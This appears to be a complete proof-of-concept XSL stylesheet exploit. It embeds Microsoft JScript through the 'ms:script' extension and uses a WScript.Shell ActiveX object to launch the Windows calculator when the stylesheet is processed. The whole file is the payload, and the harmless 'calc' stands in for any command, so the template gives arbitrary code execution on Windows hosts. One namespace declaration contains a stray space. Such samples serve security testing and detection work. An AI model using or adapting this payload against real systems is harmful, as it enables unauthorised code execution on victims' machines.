<?xml version='1.0'?>
<stylesheet
xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns: xuser = "placeholder"
version="1.0">
<output method="text"/>
  <ms:script implements-prefix="xuser" language="JScript">
  <![CDATA[
  var r = new ActiveXObject("WScript.Shell").Run("calc");
  ]]> </ms:script>
</stylesheet>
